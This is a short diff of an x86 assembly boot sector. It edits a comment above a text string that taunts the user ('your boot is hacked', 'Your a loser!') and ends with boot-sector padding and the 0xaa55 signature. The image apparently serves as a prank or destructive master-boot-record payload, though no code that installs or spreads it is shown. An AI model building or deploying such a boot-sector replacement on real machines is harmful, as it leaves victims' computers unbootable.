@@ -47,7 +47,7 @@ cls:
 	int 0x10       ; Call the BIOS interrupt!
 	ret            ; Return
 
-; the decleration of indapendance or summ like that... (create a line of text using: "first_line", 13, 10, "second_line")
+; (create a line of text using: "first_line", 13, 10, "second_line")
 display db "Your dumbass got hacked and now your boot is hacked...", 13, 10, "Im so silly", 13, 10, " ", 13, 10, " ", 13, 10, "Anyways...", 13, 10, "Your a loser! (i would have put the 'dec of indapendance' but it was to big)", 13, 10, "by: Me, your computer", 13, 10, "Anyways, have fun with your current problem :p",  13, 10, 0 ; The null terminator is very important!
 times 510 - ($ - $$) db 0 ; Zero remaining sectors
 dw 0xaa55 ; Bootable signature
